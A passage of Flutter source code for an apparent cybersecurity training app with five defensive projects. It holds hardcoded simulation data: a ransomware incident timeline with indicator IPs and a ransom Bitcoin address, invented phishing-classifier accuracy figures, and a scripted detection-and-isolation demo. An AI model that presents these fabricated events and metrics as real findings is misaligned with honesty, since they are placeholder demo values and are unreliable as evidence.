        'user': 'SYSTEM',
        'artifact': '128GB exfiltrated over HTTPS to 185.220.101.45',
        'ioc': 'High egress bandwidth anomaly',
        'severity': 'CRITICAL',
        'color': Colors.red,
      },
      {
        'time': '2024-01-15 09:23:00',
        'phase': 'Impact',
        'mitre': 'T1486',
        'event': 'Ransomware deployment begins - WannaCry variant',
        'host': 'FS-PATIENT-RECORDS',
        'ip': '192.168.1.50',
        'user': 'SYSTEM',
        'artifact': 'svchost.exe [PID:4821] encrypting files',
        'ioc': 'High-entropy writes, .WNCRY extension',
        'severity': 'CRITICAL',
        'color': Colors.red,
      },
      {
        'time': '2024-01-15 09:23:22',
        'phase': 'Impact',
        'mitre': 'T1491',
        'event': 'Ransom note dropped - @Please_Read_Me@.txt',
        'host': 'ALL SYSTEMS',
        'ip': 'Multiple',
        'user': 'SYSTEM',
        'artifact': 'READ_ME_NOW.txt - BTC payment demand',
        'ioc': 'Bitcoin address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf',
        'severity': 'CRITICAL',
        'color': Colors.red,
      },
    ];
  }

  // --- ML Model Results ---
  static Map<String, dynamic> generateMLResults() {
    return {
      'modelInfo': {
        'name': 'CyberSec Phishing Classifier v2.1',
        'architecture': 'Ensemble (BERT + CNN + Random Forest)',
        'trainedOn': '2.4M emails (50% phishing, 50% legitimate)',
        'lastUpdated': '2024-01-10',
      },
      'baselineMetrics': {
        'accuracy': 0.967,
        'precision': 0.971,
        'recall': 0.963,
        'f1Score': 0.967,
        'auc': 0.994,
        'falsePositiveRate': 0.029,
        'falseNegativeRate': 0.037,
      },
      'underAttackMetrics': {
        'accuracy': 0.634,
        'precision': 0.701,
        'recall': 0.580,
        'f1Score': 0.635,
        'auc': 0.812,
        'falsePositiveRate': 0.298,
        'falseNegativeRate': 0.420,
        'evasionSuccessRate': 0.366,
      },
      'afterDefenseMetrics': {
        'accuracy': 0.943,
        'precision': 0.951,
        'recall': 0.935,
        'f1Score': 0.943,
        'auc': 0.983,
        'falsePositiveRate': 0.049,
        'falseNegativeRate': 0.065,
        'evasionSuccessRate': 0.057,
      },
      'attackTypes': [
        {'name': 'Homoglyph Attack', 'evasionRate': 0.42, 'postDefenseEvasion': 0.08},
        {'name': 'HTML Smuggling', 'evasionRate': 0.38, 'postDefenseEvasion': 0.05},
        {'name': 'Semantic Obfuscation', 'evasionRate': 0.31, 'postDefenseEvasion': 0.04},
        {'name': 'Character Substitution', 'evasionRate': 0.28, 'postDefenseEvasion': 0.03},
        {'name': 'CSS Hidden Content', 'evasionRate': 0.35, 'postDefenseEvasion': 0.06},
      ],
      'defenses': [
        'Adversarial Training with 50K adversarial samples',
        'Unicode normalization (NFKC) preprocessing',
        'HTML sanitization and plain-text extraction',
        'Ensemble voting (reduces single-model fooling)',
        'Input denoising autoencoder',
        'Character-level CNN for homoglyph detection',
      ],
    };
  }
}

// ============================================================
// PROJECTS DATA
// ============================================================
const List<Project> projects = [
  Project(
    id: 1,
    title: 'Ransomware\nDetection',
    subtitle: 'Hospital Network Defense',
    scenario:
        'A mid-sized hospital network has experienced a ransomware attack that encrypted patient records.',
    icon: Icons.security,
    color: Color(0xFFFF3B3B),
    mitreTactic: 'T1486 - Data Encrypted for Impact',
    tasks: [
      'Behavioral file system monitor',
      'C2 network traffic analyzer',
      'Automated endpoint isolation',
      'Forensic timeline reconstruction',
    ],
    deliverable: 'Working prototype with test results against ransomware samples',
  ),
  Project(
    id: 2,
    title: 'IoT Botnet\nDetection',
    subtitle: 'Smart Home Security',
    scenario:
        'A smart home with 50+ IoT devices recruited into a Mirai-like botnet with unusual bandwidth spikes.',
    icon: Icons.router,
    color: Color(0xFF00F5FF),
    mitreTactic: 'T1498 - Network Denial of Service',
    tasks: [
      'IoT-specific NIDS design',
      'Device fingerprinting engine',
      'ML anomaly detection (Isolation Forest)',
      'Lightweight mitigation dashboard',
    ],
    deliverable: 'Deployable system with false positive rate and detection latency metrics',
  ),
  Project(
    id: 3,
    title: 'Supply Chain\nAttack Defense',
    subtitle: 'CI/CD Pipeline Security',
    scenario:
        'A build pipeline was compromised - attackers injected a backdoor into a popular open-source library.',
    icon: Icons.account_tree,
    color: Color(0xFFFF8C00),
    mitreTactic: 'T1195 - Supply Chain Compromise',
    tasks: [
      'CI/CD dependency vulnerability scanner',
      'SBOM generation and verification',
      'Runtime behavior monitor',
      'Incident response playbook automation',
    ],
    deliverable: 'Integrated security framework with attack simulation and defense validation',
  ),
  Project(
    id: 4,
    title: 'Cloud Security\nPosture',
    subtitle: 'AWS Misconfiguration Remediation',
    scenario:
        'A fintech startup left S3 buckets public and IAM roles overly permissive - data breach occurred.',
    icon: Icons.cloud,
    color: Color(0xFF9B59B6),
    mitreTactic: 'T1530 - Data from Cloud Storage',
    tasks: [
      'CSPM tool - CIS benchmark scanner',
      'Misconfiguration exploitation PoC',
      'Auto-remediation engine with rollback',
      'Compliance reporting (GDPR, PCI-DSS)',
    ],
    deliverable: 'Functional tool with before/after security assessment reports',
  ),
  Project(
    id: 5,
    title: 'Adversarial ML\nPhishing Defense',
    subtitle: 'Email Security Hardening',
    scenario:
        'Attackers use adversarial techniques (homoglyph, HTML smuggling) to evade ML phishing detectors.',
    icon: Icons.psychology,
    color: Color(0xFF00FF88),
    mitreTactic: 'T1027 - Obfuscated Files or Information',
    tasks: [
      'NLP + CV phishing classifier',
      'Adversarial attack generation',
      'Defensive countermeasures',
      'Red-team/blue-team evaluation',
    ],
    deliverable: 'End-to-end system with quantitative robustness metrics',
  ),
];

// ============================================================
// MAIN APP
// ============================================================
class CyberSecApp extends StatelessWidget {
  const CyberSecApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'CyberSec Lab',
      debugShowCheckedModeBanner: false,
      theme: AppTheme.dark,
      home: const HomeScreen(),
    );
  }
}

// ============================================================
// HOME SCREEN
// ============================================================
class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> _fadeAnim;
  int _tickCount = 0;
  late Timer _ticker;
  String _statusLine = 'SYSTEM READY';

  final List<String> _statusMessages = [
    'THREAT INTELLIGENCE FEED: ACTIVE',
    'MONITORING 247 ENDPOINTS...',
    'ANALYZING NETWORK FLOWS...',
    'ML MODELS LOADED: 5/5',
    'SBOM DATABASE: SYNCED',
    'CLOUD POSTURE: SCANNING...',
    'PHISHING CLASSIFIER: ONLINE',
    'IoT FINGERPRINTING: ACTIVE',
  ];

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );
    _fadeAnim = CurvedAnimation(parent: _controller, curve: Curves.easeInOut);
    _controller.forward();
    _ticker = Timer.periodic(const Duration(seconds: 3), (t) {
      setState(() {
        _tickCount = (_tickCount + 1) % _statusMessages.length;
        _statusLine = _statusMessages[_tickCount];
      });
    });
  }

  @override
  void dispose() {
    _controller.dispose();
    _ticker.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.primary,
      body: FadeTransition(
        opacity: _fadeAnim,
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              _buildStatusBar(),
              Expanded(
                child: Padding(
                  padding: const EdgeInsets.all(16),
                  child: GridView.builder(
                    gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                      crossAxisCount: 2,
                      crossAxisSpacing: 14,
                      mainAxisSpacing: 14,
                      childAspectRatio: 0.85,
                    ),
                    itemCount: projects.length,
                    itemBuilder: (ctx, i) => _ProjectCard(project: projects[i]),
                  ),
                ),
              ),
              _buildFooter(),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(20, 20, 20, 16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: AppTheme.accent.withValues(alpha: 0.15),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: AppTheme.accent.withValues(alpha: 0.3)),
                ),
                child: const Icon(Icons.shield, color: AppTheme.accent, size: 28),
              ),
              const SizedBox(width: 12),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'CYBERSEC LAB',
                    style: TextStyle(
                      color: AppTheme.accent,
                      fontSize: 22,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 3,
                    ),
                  ),
                  Text(
                    'Advanced Threat Research Platform',
                    style: TextStyle(
                      color: AppTheme.textSecondary,
                      fontSize: 11,
                      letterSpacing: 1.5,
                    ),
                  ),
                ],
              ),
              const Spacer(),
              _PulsingDot(color: AppTheme.accentGreen),
            ],
          ),
          const SizedBox(height: 16),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
            decoration: BoxDecoration(
              color: AppTheme.surface,
              borderRadius: BorderRadius.circular(6),
              border: Border.all(color: AppTheme.border),
            ),
            child: Row(
              children: [
                const Icon(Icons.warning_amber, color: AppTheme.accentOrange, size: 14),
                const SizedBox(width: 8),
                const Text(
                  'AUTHORIZED RESEARCH ENVIRONMENT ONLY',
                  style: TextStyle(
                    color: AppTheme.accentOrange,
                    fontSize: 10,
                    letterSpacing: 1.5,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStatusBar() {
    return AnimatedSwitcher(
      duration: const Duration(milliseconds: 500),
      child: Container(
        key: ValueKey(_statusLine),
        margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
        decoration: BoxDecoration(
          color: AppTheme.accentGreen.withValues(alpha: 0.08),
          borderRadius: BorderRadius.circular(4),
          border: Border.all(color: AppTheme.accentGreen.withValues(alpha: 0.2)),
        ),
        child: Row(
          children: [
            const Icon(Icons.terminal, color: AppTheme.accentGreen, size: 12),
            const SizedBox(width: 8),
            Text(
              '> $_statusLine',
              style: const TextStyle(
                color: AppTheme.accentGreen,
                fontSize: 10,
                fontFamily: 'monospace',
                letterSpacing: 1,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildFooter() {
    return Container(
      padding: const EdgeInsets.all(12),
      child: Text(
        'Select a project to begin • All tests in isolated lab environment',
        style: TextStyle(
          color: AppTheme.textSecondary.withValues(alpha: 0.6),
          fontSize: 10,
          letterSpacing: 0.8,
        ),
        textAlign: TextAlign.center,
      ),
    );
  }
}

class _ProjectCard extends StatefulWidget {
  final Project project;
  const _ProjectCard({required this.project});

  @override
  State<_ProjectCard> createState() => _ProjectCardState();
}

class _ProjectCardState extends State<_ProjectCard>
    with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> _scaleAnim;
  bool _hovered = false;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 150),
    );
    _scaleAnim = Tween(begin: 1.0, end: 0.96).animate(
      CurvedAnimation(parent: _controller, curve: Curves.easeInOut),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  void _onTap() {
    _controller.forward().then((_) => _controller.reverse());
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (_) => _getProjectScreen(widget.project),
      ),
    );
  }

  Widget _getProjectScreen(Project p) {
    switch (p.id) {
      case 1:
        return const Project1Screen();
      case 2:
        return const Project2Screen();
      case 3:
        return const Project3Screen();
      case 4:
        return const Project4Screen();
      case 5:
        return const Project5Screen();
      default:
        return const Project1Screen();
    }
  }

  @override
  Widget build(BuildContext context) {
    final p = widget.project;
    return ScaleTransition(
      scale: _scaleAnim,
      child: GestureDetector(
        onTap: _onTap,
        onTapDown: (_) => setState(() => _hovered = true),
        onTapUp: (_) => setState(() => _hovered = false),
        onTapCancel: () => setState(() => _hovered = false),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          decoration: BoxDecoration(
            color: AppTheme.card,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(
              color: _hovered
                  ? p.color.withValues(alpha: 0.8)
                  : p.color.withValues(alpha: 0.25),
              width: _hovered ? 2 : 1,
            ),
            boxShadow: [
              BoxShadow(
                color: p.color.withValues(alpha: _hovered ? 0.25 : 0.1),
                blurRadius: _hovered ? 20 : 10,
                spreadRadius: _hovered ? 2 : 0,
              ),
            ],
          ),
          child: Padding(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: p.color.withValues(alpha: 0.15),
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: Icon(p.icon, color: p.color, size: 24),
                    ),
                    Container(
                      padding: const EdgeInsets.symmetric(
                        horizontal: 8,
                        vertical: 3,
                      ),
                      decoration: BoxDecoration(
                        color: p.color.withValues(alpha: 0.15),
                        borderRadius: BorderRadius.circular(20),
                      ),
                      child: Text(
                        'P${p.id}',
                        style: TextStyle(
                          color: p.color,
                          fontSize: 11,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 14),
                Text(
                  p.title,
                  style: const TextStyle(
                    color: AppTheme.textPrimary,
                    fontSize: 15,
                    fontWeight: FontWeight.bold,
                    height: 1.3,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  p.subtitle,
                  style: const TextStyle(
                    color: AppTheme.textSecondary,
                    fontSize: 10,
                    letterSpacing: 0.5,
                  ),
                ),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                  decoration: BoxDecoration(
                    color: AppTheme.surface,
                    borderRadius: BorderRadius.circular(4),
                    border: Border.all(color: AppTheme.border),
                  ),
                  child: Text(
                    p.mitreTactic.split(' - ').first,
                    style: TextStyle(
                      color: p.color.withValues(alpha: 0.8),
                      fontSize: 8,
                      fontFamily: 'monospace',
                    ),
                  ),
                ),
                const SizedBox(height: 10),
                Row(
                  children: [
                    Text(
                      '${p.tasks.length} tasks',
                      style: const TextStyle(
                        color: AppTheme.textSecondary,
                        fontSize: 10,
                      ),
                    ),
                    const Spacer(),
                    Icon(
                      Icons.arrow_forward_ios,
                      color: p.color.withValues(alpha: 0.7),
                      size: 12,
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// ============================================================
// SHARED WIDGETS
// ============================================================
class _PulsingDot extends StatefulWidget {
  final Color color;
  const _PulsingDot({required this.color});

  @override
  State<_PulsingDot> createState() => _PulsingDotState();
}

class _PulsingDotState extends State<_PulsingDot>
    with SingleTickerProviderStateMixin {
  late AnimationController _c;
  late Animation<double> _a;

  @override
  void initState() {
    super.initState();
    _c = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    )..repeat(reverse: true);
    _a = Tween(begin: 0.4, end: 1.0).animate(_c);
  }

  @override
  void dispose() {
    _c.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _a,
      builder: (context, child) => Container(
        width: 10,
        height: 10,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          color: widget.color.withValues(alpha: _a.value),
          boxShadow: [
            BoxShadow(
              color: widget.color.withValues(alpha: _a.value * 0.5),
              blurRadius: 6,
              spreadRadius: 2,
            ),
          ],
        ),
      ),
    );
  }
}

class _SectionHeader extends StatelessWidget {
  final String title;
  final String? subtitle;
  final IconData icon;
  final Color color;

  const _SectionHeader({
    required this.title,
    this.subtitle,
    required this.icon,
    required this.color,
  });

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: color.withValues(alpha: 0.15),
              borderRadius: BorderRadius.circular(6),
            ),
            child: Icon(icon, color: color, size: 16),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  title,
                  style: const TextStyle(
                    color: AppTheme.textPrimary,
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 0.5,
                  ),
                ),
                if (subtitle != null)
                  Text(
                    subtitle!,
                    style: const TextStyle(
                      color: AppTheme.textSecondary,
                      fontSize: 10,
                    ),
                  ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

class _InfoChip extends StatelessWidget {
  final String label;
  final Color color;
  final IconData? icon;

  const _InfoChip({required this.label, required this.color, this.icon});

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
      decoration: BoxDecoration(
        color: color.withValues(alpha: 0.12),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withValues(alpha: 0.3)),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          if (icon != null) ...[
            Icon(icon, color: color, size: 10),
            const SizedBox(width: 4),
          ],
          Text(
            label,
            style: TextStyle(
              color: color,
              fontSize: 10,
              fontWeight: FontWeight.bold,
            ),
          ),
        ],
      ),
    );
  }
}

class _TerminalLog extends StatefulWidget {
  final List<LogEntry> entries;
  final double height;

  const _TerminalLog({required this.entries, this.height = 200});

  @override
  State<_TerminalLog> createState() => _TerminalLogState();
}

class _TerminalLogState extends State<_TerminalLog> {
  final ScrollController _scroll = ScrollController();

  @override
  void didUpdateWidget(_TerminalLog oldWidget) {
    super.didUpdateWidget(oldWidget);
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_scroll.hasClients) {
        _scroll.animateTo(
          _scroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 300),
          curve: Curves.easeOut,
        );
      }
    });
  }

  @override
  void dispose() {
    _scroll.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      height: widget.height,
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      decoration: BoxDecoration(
        color: Colors.black,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: AppTheme.accentGreen.withValues(alpha: 0.3)),
      ),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
              color: AppTheme.accentGreen.withValues(alpha: 0.08),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(7)),
            ),
            child: Row(
              children: [
                _dot(Colors.red),
                const SizedBox(width: 6),
                _dot(Colors.orange),
                const SizedBox(width: 6),
                _dot(AppTheme.accentGreen),
                const SizedBox(width: 12),
                const Text(
                  'SYSTEM LOG',
                  style: TextStyle(
                    color: AppTheme.accentGreen,
                    fontSize: 10,
                    letterSpacing: 2,
                  ),
                ),
              ],
            ),
          ),
          Expanded(
            child: ListView.builder(
              controller: _scroll,
              padding: const EdgeInsets.all(10),
              itemCount: widget.entries.length,
              itemBuilder: (_, i) {
                final e = widget.entries[i];
                return Padding(
                  padding: const EdgeInsets.only(bottom: 3),
                  child: RichText(
                    text: TextSpan(
                      children: [
                        TextSpan(
                          text: '[${e.timestamp}] ',
                          style: TextStyle(
                            color: AppTheme.textSecondary.withValues(alpha: 0.6),
                            fontSize: 9,
                            fontFamily: 'monospace',
                          ),
                        ),
                        TextSpan(
                          text: '[${e.level}] ',
                          style: TextStyle(
                            color: e.color,
                            fontSize: 9,
                            fontFamily: 'monospace',
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                        TextSpan(
                          text: e.message,
                          style: TextStyle(
                            color: e.color.withValues(alpha: 0.9),
                            fontSize: 9,
                            fontFamily: 'monospace',
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              },
            ),
          ),
        ],
      ),
    );
  }

  Widget _dot(Color c) => Container(
        width: 8,
        height: 8,
        decoration: BoxDecoration(color: c, shape: BoxShape.circle),
      );
}

class _MetricCard extends StatelessWidget {
  final String label;
  final String value;
  final Color color;
  final IconData icon;
  final String? subtitle;

  const _MetricCard({
    required this.label,
    required this.value,
    required this.color,
    required this.icon,
    this.subtitle,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: AppTheme.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withValues(alpha: 0.25)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Icon(icon, color: color, size: 18),
          const SizedBox(height: 8),
          Text(
            value,
            style: TextStyle(
              color: color,
              fontSize: 20,
              fontWeight: FontWeight.bold,
            ),
          ),
          const SizedBox(height: 2),
          Text(
            label,
            style: const TextStyle(
              color: AppTheme.textPrimary,
              fontSize: 11,
              fontWeight: FontWeight.w500,
            ),
          ),
          if (subtitle != null)
            Text(
              subtitle!,
              style: const TextStyle(
                color: AppTheme.textSecondary,
                fontSize: 9,
              ),
            ),
        ],
      ),
    );
  }
}

class _StepCard extends StatelessWidget {
  final int step;
  final String title;
  final String description;
  final Color color;
  final bool isCompleted;
  final bool isActive;

  const _StepCard({
    required this.step,
    required this.title,
    required this.description,
    required this.color,
    this.isCompleted = false,
    this.isActive = false,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: isActive
            ? color.withValues(alpha: 0.08)
            : AppTheme.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: isActive
              ? color.withValues(alpha: 0.5)
              : isCompleted
                  ? AppTheme.accentGreen.withValues(alpha: 0.3)
                  : AppTheme.border,
        ),
      ),
      child: Row(
        children: [
          Container(
            width: 32,
            height: 32,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: isCompleted
                  ? AppTheme.accentGreen.withValues(alpha: 0.2)
                  : isActive
                      ? color.withValues(alpha: 0.2)
                      : AppTheme.border.withValues(alpha: 0.3),
              border: Border.all(
                color: isCompleted
                    ? AppTheme.accentGreen
                    : isActive
                        ? color
                        : AppTheme.border,
              ),
            ),
            child: Center(
              child: isCompleted
                  ? const Icon(Icons.check, color: AppTheme.accentGreen, size: 14)
                  : Text(
                      '$step',
                      style: TextStyle(
                        color: isActive ? color : AppTheme.textSecondary,
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  title,
                  style: TextStyle(
                    color: isActive ? color : AppTheme.textPrimary,
                    fontSize: 13,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 3),
                Text(
                  description,
                  style: const TextStyle(
                    color: AppTheme.textSecondary,
                    fontSize: 11,
                  ),
                ),
              ],
            ),
          ),
          if (isActive)
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
              decoration: BoxDecoration(
                color: color.withValues(alpha: 0.15),
                borderRadius: BorderRadius.circular(20),
              ),
              child: Text(
                'ACTIVE',
                style: TextStyle(color: color, fontSize: 8, fontWeight: FontWeight.bold),
              ),
            ),
        ],
      ),
    );
  }
}

Widget _buildSeverityBadge(String severity) {
  Color color;
  switch (severity.toUpperCase()) {
    case 'CRITICAL':
      color = AppTheme.accentRed;
      break;
    case 'HIGH':
      color = AppTheme.accentOrange;
      break;
    case 'MEDIUM':
      color = Colors.yellow;
      break;
    case 'LOW':
      color = AppTheme.accentGreen;
      break;
    default:
      color = AppTheme.textSecondary;
  }
  return _InfoChip(label: severity, color: color);
}

AppBar _buildAppBar(BuildContext context, String title, String subtitle, Color color) {
  return AppBar(
    leading: IconButton(
      icon: const Icon(Icons.arrow_back_ios),
      onPressed: () => Navigator.pop(context),
    ),
    title: Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(title, style: TextStyle(color: color, fontSize: 16, letterSpacing: 0.5)),
        Text(
          subtitle,
          style: const TextStyle(
            color: AppTheme.textSecondary,
            fontSize: 10,
            letterSpacing: 0.5,
          ),
        ),
      ],
    ),
    backgroundColor: AppTheme.surface,
  );
}

// ============================================================
// PROJECT 1: RANSOMWARE DETECTION
// ============================================================
class Project1Screen extends StatefulWidget {
  const Project1Screen({super.key});

  @override
  State<Project1Screen> createState() => _Project1ScreenState();
}

class _Project1ScreenState extends State<Project1Screen>
    with SingleTickerProviderStateMixin {
  late TabController _tabs;
  final List<LogEntry> _logs = [];
  bool _isScanning = false;
  bool _threatDetected = false;
  bool _isolated = false;
  int _encryptedFiles = 0;
  int _activeStep = 0;
  late Timer? _scanTimer;
  final List<Map<String, dynamic>> _fileEvents = [];
  final List<Map<String, dynamic>> _networkTraffic = [];
  final List<Map<String, dynamic>> _forensicTimeline = [];

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 4, vsync: this);
    _fileEvents.addAll(TestDataGenerator.generateFileEvents());
    _networkTraffic.addAll(TestDataGenerator.generateNetworkTraffic());
    _forensicTimeline.addAll(TestDataGenerator.generateForensicTimeline());
    _addLog('INFO', 'Ransomware Detection System initialized', AppTheme.accentGreen);
    _addLog('INFO', 'File system monitor: ACTIVE', AppTheme.accentGreen);
    _addLog('INFO', 'Network analyzer: ACTIVE', AppTheme.accentGreen);
    _addLog('INFO', 'Behavioral AI engine: LOADED', AppTheme.accentGreen);
  }

  @override
  void dispose() {
    _tabs.dispose();
    _scanTimer?.cancel();
    super.dispose();
  }

  void _addLog(String level, String msg, Color color) {
    final now = DateTime.now();
    setState(() {
      _logs.add(LogEntry(
        timestamp: '${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}:${now.second.toString().padLeft(2, '0')}',
        level: level,
        message: msg,
        color: color,
      ));
    });
  }

  void _startScan() {
    if (_isScanning) return;
    setState(() {
      _isScanning = true;
      _threatDetected = false;
      _isolated = false;
      _encryptedFiles = 0;
      _activeStep = 1;
    });

    final steps = [
      () {
        _addLog('SCAN', 'Monitoring file system events...', AppTheme.accent);
        _addLog('INFO', 'Baseline entropy analysis: normal (avg 4.2 bits)', AppTheme.accentGreen);
      },
      () {
        _addLog('SCAN', 'Analyzing network traffic patterns...', AppTheme.accent);
        _addLog('INFO', 'C2 signature matching active', AppTheme.accentGreen);
      },
      () {
        _addLog('WARN', 'ANOMALY: svchost.exe PID:4821 - high frequency writes', AppTheme.accentOrange);
        _addLog('WARN', 'File entropy spike: 7.8 bits (threshold: 7.0)', AppTheme.accentOrange);
        setState(() => _activeStep = 2);
      },
      () {
        _addLog('ALERT', 'RANSOMWARE DETECTED: Extension changes .pdf → .encrypted', AppTheme.accentRed);
        _addLog('ALERT', 'Encrypted files count: 847 in 12 seconds', AppTheme.accentRed);
        _addLog('ALERT', 'C2 communication: 185.220.101.45:443 detected', AppTheme.accentRed);
        setState(() {
          _threatDetected = true;
          _encryptedFiles = 847;
          _activeStep = 3;
        });
      },
      () {
        _addLog('ACTION', 'ISOLATING: WS-NURSING-012 from network...', AppTheme.accentOrange);
        _addLog('ACTION', 'Blocking C2 IP: 185.220.101.45', AppTheme.accentOrange);
        _addLog('ACTION', 'Killing process: svchost.exe PID:4821', AppTheme.accentOrange);
        setState(() {
          _isolated = true;
          _activeStep = 4;
          _isScanning = false;
        });
        _addLog('OK', 'Endpoint quarantined. Forensic snapshot captured.', AppTheme.accentGreen);
      },
    ];

    int i = 0;
    _scanTimer = Timer.periodic(const Duration(milliseconds: 1800), (t) {
      if (i < steps.length) {
        steps[i]();
        i++;
      } else {
        t.cancel();
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.primary,
      appBar: _buildAppBar(context, 'Project 1: Ransomware Detection',
          'Hospital Network Defense', const Color(0xFFFF3B3B)),
      body: Column(
        children: [
          _buildP1Metrics(),
          TabBar(
            controller: _tabs,
            isScrollable: true,
            indicatorColor: const Color(0xFFFF3B3B),
            labelColor: const Color(0xFFFF3B3B),
            unselectedLabelColor: AppTheme.textSecondary,
            labelStyle: const TextStyle(fontSize: 11, fontWeight: FontWeight.bold),
            tabs: const [
              Tab(text: 'OVERVIEW'),
              Tab(text: 'FILE EVENTS'),
              Tab(text: 'NETWORK'),
              Tab(text: 'FORENSICS'),
            ],
          ),
          Expanded(
            child: TabBarView(
              controller: _tabs,
              children: [
                _buildOverviewTab(),
                _buildFileEventsTab(),
                _buildNetworkTab(),
                _buildForensicsTab(),
              ],
            ),
          ),
        ],
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: _isScanning ? null : _startScan,
        backgroundColor: _isScanning
            ? AppTheme.border
            : const Color(0xFFFF3B3B),
        icon: _isScanning
            ? const SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  color: Colors.white,
                ),
              )
            : const Icon(Icons.play_arrow),
        label: Text(_isScanning ? 'SCANNING...' : 'RUN SIMULATION'),
      ),
    );
  }

  Widget _buildP1Metrics() {
    return Container(
      padding: const EdgeInsets.all(12),
      child: Row(
        children: [
          Expanded(
            child: _MetricCard(
              label: 'Encrypted Files',
              value: '$_encryptedFiles',
              color: _encryptedFiles > 0 ? AppTheme.accentRed : AppTheme.accentGreen,
              icon: Icons.lock,
              subtitle: 'Detected',
            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: _MetricCard(
              label: 'Threat Status',
              value: _threatDetected ? 'DETECTED' : 'CLEAN',
              color: _threatDetected ? AppTheme.accentRed : AppTheme.accentGreen,
              icon: Icons.warning,
              subtitle: 'Ransomware',
